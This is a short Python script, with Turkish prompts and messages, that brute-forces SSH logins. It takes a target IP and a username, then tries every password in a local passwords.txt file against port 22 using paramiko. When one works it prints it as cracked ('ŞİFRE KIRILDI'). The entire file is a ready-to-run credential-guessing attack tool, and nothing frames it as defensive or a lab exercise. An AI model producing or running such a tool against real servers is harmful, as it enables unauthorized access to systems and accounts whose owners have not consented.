import paramiko
import time
import os

print("--- SSH BRUTE FORCE ---")
host = input("Hedef IP: ")
username = input("Kullanıcı Adı: ")
password_file = "passwords.txt"

def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        return True
    except:
        return False

if os.path.exists(password_file):
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()
            print(f"Deneniyor: {password}")
            if ssh_connect(password):
                print(f"\n🎉 ŞİFRE KIRILDI! Password: {password}")
                break
            time.sleep(0.5)
else:
    print("❌ passwords.txt bulunamadı!")